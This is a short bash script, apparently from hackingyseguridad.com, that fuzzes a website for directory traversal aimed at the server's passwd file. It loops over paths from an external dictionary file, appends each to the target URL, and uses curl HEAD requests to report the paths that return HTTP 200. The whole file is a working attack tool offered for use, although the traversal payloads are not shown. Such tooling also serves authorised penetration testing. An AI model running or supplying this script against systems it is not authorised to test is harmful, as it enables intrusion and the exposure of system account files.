#!/bin/bash
cat << "INFO"
   __                          _     _   _
  / _|                        | |   | | | |
 | |_ _   _ ___________ _ __  | |__ | |_| |_ _ __
 |  _| | | |_  /_  / _ \ '__| | '_ \| __| __| '_ \
 | | | |_| |/ / / /  __/ |    | | | | |_| |_| |_) |
 |_|  \__,_/___/___\___|_|    |_| |_|\__|\__| .__/
                                            | |
                     hackingyseguridad.com  |_|

INFO
if [ -z "$1" ]; then
        echo
        echo "Directorio traversal sobre fichero passwd en url de sitio web por HTTP/1.1 200 OK.. "
        echo "Uso: $0 <http://dominio.com>"
        exit 0
fi
echo
echo "Fuzzer de: " $1
echo

for n in `cat diccionario.txt`

do
        fqdn=$1$n
        echo $fqdn
        if curl $fqdn -I --silent|grep "HTTP/1.1 200 OK"
        then echo $fqdn
        fi
done
